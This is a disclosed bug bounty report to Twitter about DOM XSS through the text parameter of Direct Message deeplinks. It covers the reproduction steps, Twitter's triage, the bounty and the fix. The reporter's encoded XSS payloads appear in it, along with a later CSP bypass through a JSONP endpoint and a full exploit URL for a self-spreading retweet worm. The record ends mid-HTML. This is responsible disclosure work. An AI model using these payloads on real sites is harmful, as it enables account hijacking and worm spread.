{"id":341908,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNDE5MDg=","url":"https://hackerone.com/reports/341908","title":"XSS via Direct Message deeplinks","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2018-04-23T05:13:18.832Z","submitted_at":"2018-04-23T05:13:18.832Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"0xsobky","url":"/0xsobky","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/KUci7XnpJPBx2BXVZpjgovzZ/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":61,"url":"https://hackerone.com/twitter","handle":"twitter","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/061/85a63a443f017ad8353de4f68ebf52fdd61c345a_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/061/85a63a443f017ad8353de4f68ebf52fdd61c345a_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Twitter","twitter_handle":"twittersecurity","website":"https://twitter.com","about":"Twitter helps you create and share ideas and information instantly, without barriers."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-05-09T18:03:28.588Z","bug_reporter_agreed_on_going_public_at":"2019-05-02T15:21:33.320Z","team_member_agreed_on_going_public_at":"2019-05-09T18:03:28.502Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"**Description:** \nBy using a specially crafted payload as the value of the text parameter in a Direct Message deeplink, a malicious user can inject arbitrary HTML tags and possibly run arbitrary JavaScript code on the \"twitter.com\" origin.\n\n## Steps To Reproduce:\n\n  1. Create a Direct Message deeplink by following the instructions on this [Twitter developer guide](https://developer.twitter.com/en/docs/direct-messages/welcome-messages/guides/deeplinking-to-welcome-message).\n  2. Use the following payload as the value for the text parameter:\n```\n%3C%3C/%3Cx%3E/script/test000%3E%3C%3C/%3Cx%3Esvg%20onload%3Dalert%28%29%3E%3C/%3E%3Cscript%3E1%3C%5Cx%3E2\n```\n  3. Tweet the deeplink you created. It should look like the following:\n```\nhttps://twitter.com/messages/compose?recipient_id=988260476659404801\u0026welcome_message_id=988274596427304964\u0026text=%3C%3C/%3Cx%3E/script/test000%3E%3C%3C/%3Cx%3Esvg%20onload%3Dalert%28%29%3E%3C/%3E%3Cscript%3E1%3C%5Cx%3E2\n```\n\n## Impact\n\nIt seems that the deployed CSP policy currently blocks the execution of arbitrary JavaScript code, however, arbitrary HTML tags can still be injection on `twitter.com` to carry out other kinds of attacks (i.e., deanonymization attacks, phishing, etc.). While you're in the process of verifying this, I'll be working on a bypass for the CSP policy in order to execute arbitrary JavaScript.\n\nThe hacker selected the **Cross-site Scripting (XSS) - DOM** weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:\n\n**URL**\nhttps://twitter.com/fvofo0000001444/status/988278372894740480\n\n**Verified**\nYes\n\n","vulnerability_information_html":"\u003cp\u003e\u003cstrong\u003eDescription:\u003c/strong\u003e \u003cbr\u003e\nBy using a specially crafted payload as the value of the text parameter in a Direct Message deeplink, a malicious user can inject arbitrary HTML tags and possibly run arbitrary JavaScript code on the \u0026quot;twitter.com\u0026quot; origin.\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003col\u003e\n\u003cli\u003eCreate a Direct Message deeplink by following the instructions on this \u003ca href=\"/redirect?url=https%3A%2F%2Fdeveloper.twitter.com%2Fen%2Fdocs%2Fdirect-messages%2Fwelcome-messages%2Fguides%2Fdeeplinking-to-welcome-message\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eTwitter developer guide\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/li\u003e\n\u003cli\u003eUse the following payload as the value for the text parameter:\n\u003ccode\u003e\n%3C%3C/%3Cx%3E/script/test000%3E%3C%3C/%3Cx%3Esvg%20onload%3Dalert%28%29%3E%3C/%3E%3Cscript%3E1%3C%5Cx%3E2\n\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003eTweet the deeplink you created. It should look like the following:\n\u003ccode\u003e\nhttps://twitter.com/messages/compose?recipient_id=988260476659404801\u0026amp;welcome_message_id=988274596427304964\u0026amp;text=%3C%3C/%3Cx%3E/script/test000%3E%3C%3C/%3Cx%3Esvg%20onload%3Dalert%28%29%3E%3C/%3E%3Cscript%3E1%3C%5Cx%3E2\n\u003c/code\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eIt seems that the deployed CSP policy currently blocks the execution of arbitrary JavaScript code, however, arbitrary HTML tags can still be injection on \u003ccode\u003etwitter.com\u003c/code\u003e to carry out other kinds of attacks (i.e., deanonymization attacks, phishing, etc.). While you\u0026#39;re in the process of verifying this, I\u0026#39;ll be working on a bypass for the CSP policy in order to execute arbitrary JavaScript.\u003c/p\u003e\n\n\u003cp\u003eThe hacker selected the \u003cstrong\u003eCross-site Scripting (XSS) - DOM\u003c/strong\u003e weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eURL\u003c/strong\u003e\u003cbr\u003e\n\u003ca title=\"https://twitter.com/fvofo0000001444/status/988278372894740480\" href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2Ffvofo0000001444%2Fstatus%2F988278372894740480\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://twitter.com/fvofo0000001444/status/988278372894740480\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eVerified\u003c/strong\u003e\u003cbr\u003e\nYes\u003c/p\u003e\n","bounty_amount":"2940.0","formatted_bounty":"$2,940","weakness":{"id":63,"name":"Cross-site Scripting (XSS) - DOM"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":289494,"file_name":"screenshot.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/289/494/10e65052fac77d1f74e0f6544c9568b7ca6f467a/screenshot.png?response-content-disposition=attachment%3B%20filename%3D%22screenshot.png%22%3B%20filename%2A%3DUTF-8%27%27screenshot.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXJYPBHFQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T053915Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDu4%2FXsLbLXL64kN0gTqrVP%2B6YQy0aFrAsl8mmpM3A02gIhAMCTWiWTqJYsWHj2mR6ExJkLtM%2BAer5nJ1p6uJxIO04QKrQDCFQQARoMMDEzNjE5Mjc0ODQ5IgyKVAfpOTinzYsPSPkqkQMwQonGdI9p7CuN4bjSzjzCvtK%2FWWqz3YU8bTMgRxd1lvP8n%2BmQUW%2FPjx22yWgMPRHSApDfLhipeKY57Ywk6GpNSLkFsR4mWXVTUZ3fv%2BFpIecsA7FNlVffsWQFQL1hvyVhQXlfUb877oYsLHI7rvsdEl2oxxoNNBVppK7LLDUZ5Hszb5rUUqEs3JeInglYJgHEk0JqpQ59Rfq6iusCJYxnpCRnEk4ATJ3WPY0fYnF5%2BrjplwvF9jvrWA8ORsehD7OObtIyHgdE%2BeHQJDIwKM12S2Z3doq1C1frQwXKFiUX0Y9ZT6Dew0nqLavJd23CiqxMaeH6L8Dme7K0ES6LXhVDxzX5ZM48Lw97Faf%2BmTRwYynJlpTsMle9l6X4AISAwVe8d6Y3lMwIoUf05EQESF56DAXqAPPLzIguWqYse43Fu3rR0Kod4SRKI9ETYrP01wRz5xVgd2auQ8kejiA8344efyhQxkc3iBze4UukBtqzk604geJ6wyBSmoicpk9XqO8dvlhwhYEGoL4EWTozQffflzDAr6r%2FBTrqAb3yz5skpTmfiHh2mY%2FhHGiWzvhaSmhQ5tEgt4YCDEprvoxeYWkvlaxqdLXcMfRTr89qs4wuii5IpOn31c13IIFZzpa09Cs%2BExrDUX44ykH0g1zxLN374%2BwiIK3wd5v3201Stw8drFGqAKHIFBpAjuZIFF37RxSxGgAxlHskSrBBA1YzTX1SQV7r%2FcyXcvsAXO99Rr3E6FQFka96boq3PmqqeaoYxAs03IbehGcOPJ%2F3Ih7ebkxTDLG%2B75tCeMz1g%2BKNymUDx9%2B0KJfzKzXbCzi5TX8vNPGUyjZh2Y7SNRHBl7hFmGgXNktN5w%3D%3D\u0026X-Amz-Signature=586850148f26afc21250eda420b873b0b3d1bcae6818f9cff493a00d2d4dc602","file_size":152597,"type":"image/png"}],"allow_singular_disclosure_at":"2019-06-01T15:21:33.417Z","allow_singular_disclosure_after":-49817862.02634129,"singular_disclosure_allowed":true,"vote_count":224,"voters":["overjt","ranapir","ermilov","samengmg","jensec","sultancad","karma7","pomme","ziot","cdl","and 214 more..."],"structured_scope":{"databaseId":1062,"asset_type":"URL","asset_identifier":"*.twitter.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":2652545,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"The following snippet shows how the payload gets reflected within the DOM:\n```html\n \u003cscript type=\"text/twitter-cards-serialization\"\u003e\n    {\n      \"strings\": { },\n      \"card\": {\n  [...]\n  \"default_composer_text\" : \"\u003c/script/test000\u003e\u003csvg onload=alert()\u003e\",\n  [...]\n},\n      [...]\n      }\n    }\n  \u003c/script\u003e\n```\n\nWhile special characters like double quotes are currently being escaped properly—HTML tags are not being stripped out in a proper manner. I believe the proper fix for this issue is to encode all special characters using JavaScript encoding (i.e., the \\uXXXX unicode escaping format).","markdown_message":"\u003cp\u003eThe following snippet shows how the payload gets reflected within the DOM:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e \u003cspan class=\"nt\"\u003e\u0026lt;script \u003c/span\u003e\u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;text/twitter-cards-serialization\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003estrings\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e \u003cspan class=\"p\"\u003e},\u003c/span\u003e\n      \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ecard\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e[...]\u003c/span\u003e\n  \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003edefault_composer_text\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026lt;/script/test000\u0026gt;\u0026lt;svg onload=alert()\u0026gt;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e[...]\u003c/span\u003e\n\u003cspan class=\"p\"\u003e},\u003c/span\u003e\n      \u003cspan class=\"p\"\u003e[...]\u003c/span\u003e\n      \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;/script\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWhile special characters like double quotes are currently being escaped properly—HTML tags are not being stripped out in a proper manner. I believe the proper fix for this issue is to encode all special characters using JavaScript encoding (i.e., the \\uXXXX unicode escaping format).\u003c/p\u003e\n","automated_response":false,"created_at":"2018-04-23T06:26:56.636Z","updated_at":"2018-04-23T06:26:56.636Z","actor":{"username":"0xsobky","cleared":false,"url":"/0xsobky","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/KUci7XnpJPBx2BXVZpjgovzZ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2655698,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Note: The card with the malicious payload can also be accessed directly using the following URI \"https://twitter.com/i/cards/tfw/v1/988278372894740480\".","markdown_message":"\u003cp\u003eNote: The card with the malicious payload can also be accessed directly using the following URI \u0026quot;\u003ca title=\"https://twitter.com/i/cards/tfw/v1/988278372894740480\" href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2Fi%2Fcards%2Ftfw%2Fv1%2F988278372894740480\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://twitter.com/i/cards/tfw/v1/988278372894740480\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u0026quot;.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-04-23T17:40:24.001Z","updated_at":"2018-04-23T17:41:10.224Z","actor":{"username":"0xsobky","cleared":false,"url":"/0xsobky","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/KUci7XnpJPBx2BXVZpjgovzZ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2656477,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Please note that this XSS works fine on the latest version of Internet Explorer without a CSP bypass (as shown in the attached screenshot). Moreover, data exfiltration attacks are also a possibility.","markdown_message":"\u003cp\u003ePlease note that this XSS works fine on the latest version of Internet Explorer without a CSP bypass (as shown in the attached screenshot). Moreover, data exfiltration attacks are also a possibility.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-04-23T19:05:49.201Z","updated_at":"2018-04-23T19:05:49.201Z","actor":{"username":"0xsobky","cleared":false,"url":"/0xsobky","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/KUci7XnpJPBx2BXVZpjgovzZ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":289737,"filename":"screenshot2.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/289/737/3411d0d3c6bd12a40ddcfb92f27b6e143da3847b/screenshot2.png?response-content-disposition=attachment%3B%20filename%3D%22screenshot2.png%22%3B%20filename%2A%3DUTF-8%27%27screenshot2.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXJYPBHFQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T053915Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDu4%2FXsLbLXL64kN0gTqrVP%2B6YQy0aFrAsl8mmpM3A02gIhAMCTWiWTqJYsWHj2mR6ExJkLtM%2BAer5nJ1p6uJxIO04QKrQDCFQQARoMMDEzNjE5Mjc0ODQ5IgyKVAfpOTinzYsPSPkqkQMwQonGdI9p7CuN4bjSzjzCvtK%2FWWqz3YU8bTMgRxd1lvP8n%2BmQUW%2FPjx22yWgMPRHSApDfLhipeKY57Ywk6GpNSLkFsR4mWXVTUZ3fv%2BFpIecsA7FNlVffsWQFQL1hvyVhQXlfUb877oYsLHI7rvsdEl2oxxoNNBVppK7LLDUZ5Hszb5rUUqEs3JeInglYJgHEk0JqpQ59Rfq6iusCJYxnpCRnEk4ATJ3WPY0fYnF5%2BrjplwvF9jvrWA8ORsehD7OObtIyHgdE%2BeHQJDIwKM12S2Z3doq1C1frQwXKFiUX0Y9ZT6Dew0nqLavJd23CiqxMaeH6L8Dme7K0ES6LXhVDxzX5ZM48Lw97Faf%2BmTRwYynJlpTsMle9l6X4AISAwVe8d6Y3lMwIoUf05EQESF56DAXqAPPLzIguWqYse43Fu3rR0Kod4SRKI9ETYrP01wRz5xVgd2auQ8kejiA8344efyhQxkc3iBze4UukBtqzk604geJ6wyBSmoicpk9XqO8dvlhwhYEGoL4EWTozQffflzDAr6r%2FBTrqAb3yz5skpTmfiHh2mY%2FhHGiWzvhaSmhQ5tEgt4YCDEprvoxeYWkvlaxqdLXcMfRTr89qs4wuii5IpOn31c13IIFZzpa09Cs%2BExrDUX44ykH0g1zxLN374%2BwiIK3wd5v3201Stw8drFGqAKHIFBpAjuZIFF37RxSxGgAxlHskSrBBA1YzTX1SQV7r%2FcyXcvsAXO99Rr3E6FQFka96boq3PmqqeaoYxAs03IbehGcOPJ%2F3Ih7ebkxTDLG%2B75tCeMz1g%2BKNymUDx9%2B0KJfzKzXbCzi5TX8vNPGUyjZh2Y7SNRHBl7hFmGgXNktN5w%3D%3D\u0026X-Amz-Signature=edb7c3fbfef5e9fc8eb99835c9149e5d8bc66f639fa1a93df55af68df66f7f9f"}],"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2661549,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"One more little detail:\nWhen reproducing this, remember that you have to first turn on the ability to receive Direct Messages from anyone—as mentioned in this blog post \"https://blog.twitter.com/marketing/en_us/a/2016/best-practices-using-direct-messages-for-customer-service-0.html\".","markdown_message":"\u003cp\u003eOne more little detail:\u003cbr\u003e\nWhen reproducing this, remember that you have to first turn on the ability to receive Direct Messages from anyone—as mentioned in this blog post \u0026quot;\u003ca title=\"https://blog.twitter.com/marketing/en_us/a/2016/best-practices-using-direct-messages-for-customer-service-0.html\" href=\"/redirect?url=https%3A%2F%2Fblog.twitter.com%2Fmarketing%2Fen_us%2Fa%2F2016%2Fbest-practices-using-direct-messages-for-customer-service-0.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://blog.twitter.com/marketing/en_us/a/2016/best-practices-using-direct-messages-for-customer-service-0.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u0026quot;.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-04-24T21:10:29.855Z","updated_at":"2018-04-24T21:14:01.626Z","actor":{"username":"0xsobky","cleared":false,"url":"/0xsobky","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/KUci7XnpJPBx2BXVZpjgovzZ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2661550,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"​","markdown_message":"\u003cp\u003e​\u003c/p\u003e\n","automated_response":false,"created_at":"2018-04-24T21:10:30.593Z","updated_at":"2018-04-24T21:13:33.318Z","actor":{"username":"0xsobky","cleared":false,"url":"/0xsobky","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/KUci7XnpJPBx2BXVZpjgovzZ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2661872,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for your report. We believe it may be a valid security issue and will investigate it further. It could take some time to find and update the root cause for an issue, so we thank you for your patience.\n\nThank you for helping keep Twitter secure!","markdown_message":"\u003cp\u003eThank you for your report. We believe it may be a valid security issue and will investigate it further. It could take some time to find and update the root cause for an issue, so we thank you for your patience.\u003c/p\u003e\n\n\u003cp\u003eThank you for helping keep Twitter secure!\u003c/p\u003e\n","automated_response":false,"created_at":"2018-04-24T23:40:27.812Z","updated_at":"2018-04-24T23:40:27.812Z","actor":{"username":"andrewsorensen","cleared":false,"url":"/andrewsorensen","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2673784,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks again. As mentioned we’ll keep you updated as we investigate further. As a reminder, please remember to keep the details of this report private until we have fully investigated and addressed the issue.","markdown_message":"\u003cp\u003eThanks again. As mentioned we’ll keep you updated as we investigate further. As a reminder, please remember to keep the details of this report private until we have fully investigated and addressed the issue.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-04-27T18:55:25.073Z","updated_at":"2018-04-27T18:55:25.073Z","actor":{"url":"/twitter","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/061/85a63a443f017ad8353de4f68ebf52fdd61c345a_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Twitter"}},"bounty_amount":"2940.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"twitter","collaborator":{"username":"0xsobky","url":"/0xsobky"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2701323,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"We consider this issue to be fixed now. Can you please confirm?\n\nThank you for helping keep Twitter secure!","markdown_message":"\u003cp\u003eWe consider this issue to be fixed now. Can you please confirm?\u003c/p\u003e\n\n\u003cp\u003eThank you for helping keep Twitter secure!\u003c/p\u003e\n","automated_response":false,"created_at":"2018-05-04T17:32:18.478Z","updated_at":"2018-05-04T17:32:18.478Z","actor":{"username":"andrewsorensen","cleared":false,"url":"/andrewsorensen","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"0xsobky","url":"/0xsobky"},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2764753,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sorry for the late reply. I can confirm this issue is now fixed. But I think the fix could be improved further. Right now, I can't terminate the script tag because the forward slash character \"/\" gets prepended with a double backslash `\\\\` (using `\u003c\u003cx\u003e/script\u003e` as a payload turns into `\u003c\\\\/script\u003e\\\\u00A0`). But just the fact that HTML tags are not being stripped out properly is concerning.\n\nIf an attacker could figure out a way to smuggle a forward slash without it being escaped, or if there is theoretically any other way to terminate an HTML tag without a literal forward slash, the current fix could be completely bypassed. So I think angle brackets \"\u003c\u003e\" should at least be escaped as `\\u003c\\u003e`.","markdown_message":"\u003cp\u003eSorry for the late reply. I can confirm this issue is now fixed. But I think the fix could be improved further. Right now, I can\u0026#39;t terminate the script tag because the forward slash character \u0026quot;/\u0026quot; gets prepended with a double backslash \u003ccode\u003e\\\\\u003c/code\u003e (using \u003ccode\u003e\u0026lt;\u0026lt;x\u0026gt;/script\u0026gt;\u003c/code\u003e as a payload turns into \u003ccode\u003e\u0026lt;\\\\/script\u0026gt;\\\\u00A0\u003c/code\u003e). But just the fact that HTML tags are not being stripped out properly is concerning.\u003c/p\u003e\n\n\u003cp\u003eIf an attacker could figure out a way to smuggle a forward slash without it being escaped, or if there is theoretically any other way to terminate an HTML tag without a literal forward slash, the current fix could be completely bypassed. So I think angle brackets \u0026quot;\u0026lt;\u0026gt;\u0026quot; should at least be escaped as \u003ccode\u003e\\u003c\\u003e\u003c/code\u003e.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-05-19T04:19:41.984Z","updated_at":"2018-05-19T04:23:56.126Z","actor":{"username":"0xsobky","cleared":false,"url":"/0xsobky","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/KUci7XnpJPBx2BXVZpjgovzZ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4503548,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @andrewsorensen,\n\nI'm going to publish a write-up about this issue later this week. However, I wanted to make you aware that I've found a CSP bypass that could've turned this vulnerability into a fully-fledged XSS worm that executes on any modern web browser and can propagate throughout all active Twitter accounts.\n\nThe current Twitter CSP policy allows scripts from \"https://*.twimg.com\", and while the following JSONP endpoint \"https://syndication.twimg.com/timeline/profile?callback=\" prefixes the callback with a \"\\_\\_twttr\" prefix, this limitation can be bypassed by injecting an HTML element with this value \"\\_\\_twttr\" as an element ID.\n\nWhile the XSS vulnerability itself has already been fixed, if an attacker were to find a similar XSS issue, he could create a fully-fledged XSS worm using the following payload:\n```html\n\u003c/script\u003e\u003ciframe id=__twttr src=/intent/retweet?tweet_id=1114986988128624640\u003e\u003c/iframe\u003e\u003cscript src=//syndication.twimg.com/timeline/profile?callback=__twttr/alert;user_id=12\u003e\u003c/script\u003e\u003cscript src=//syndication.twimg.com/timeline/profile?callback=__twttr/frames[0].retweet_btn_form.submit;user_id=12\u003e\n```\n\n\nThe following is an exploit that would've leveraged this XSS issue alongside the CSP bypass in order to create the XSS worm:\n```\nhttps://twitter.com/messages/compose?recipient_id=988260476659404801\u0026welcome_message_id=988274596427304964\u0026text=%3C%3Cx%3E/script%3E%3C%3Cx%3Eiframe%20id%3D__twttr%20src%3D/intent/retweet%3Ftweet_id%3D1114986988128624640%3E%3C%3Cx%3E/iframe%3E%3C%3Cx%3Escript%20src%3D//syndication.twimg.com/timeline/profile%3Fcallback%3D__twttr/alert%3Buser_id%3D12%3E%3C%3Cx%3E/script%3E%3C%3Cx%3Escript%20src%3D//syndication.twimg.com/timeline/profile%3Fcallback%3D__twttr/frames%5B0%5D.retweet_btn_form.submit%3Buser_id%3D12%3E\n```\n\nNote: You can verify the CSP bypass by heading to \"https://twitter.com/i/cards/tfw/v1/1114986988128624640\" and executing this in the browser console (while logged in—tested on latest Chrome):\n```javascript\ndocument.write(document.body.innerHTML.replace(/\\\\\\\\\\//g,'/'));\n```\n\nIf you would like to fix the CSP bypass in order to mitigate the risk of such issues in the future, I might consider delaying the publication of my full write-up until then.\n\nLet me know what you think,\nThanks!","markdown_message":"\u003cp\u003eHi \u003ca href=\"/andrewsorensen\"\u003e@andrewsorensen\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;m going to publish a write-up about this issue later this week. However, I wanted to make you aware that I\u0026#39;ve found a CSP bypass that could\u0026#39;ve turned this vulnerability into a fully-fledged XSS worm that executes on any modern web browser and can propagate throughout all active Twitter accounts.\u003c/p\u003e\n\n\u003cp\u003eThe current Twitter CSP policy allows scripts from \u0026quot;https://*.twimg.com\u0026quot;, and while the following JSONP endpoint \u0026quot;\u003ca title=\"https://syndication.twimg.com/timeline/profile?callback=\" href=\"/redirect?url=https%3A%2F%2Fsyndication.twimg.com%2Ftimeline%2Fprofile%3Fcallback%3D\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://syndication.twimg.com/timeline/profile?callback=\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u0026quot; prefixes the callback with a \u0026quot;__twttr\u0026quot; prefix, this limitation can be bypassed by injecting an HTML element with this value \u0026quot;__twttr\u0026quot; as an element ID.\u003c/p\u003e\n\n\u003cp\u003eWhile the XSS vulnerability itself has already been fixed, if an attacker were to find a similar XSS issue, he could create a fully-fledged XSS worm using the following payload:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;/script\u0026gt;\u0026lt;iframe\u003c/span\u003e \u003cspan class=\"na\"\u003eid=\u003c/span\u003e\u003cspan 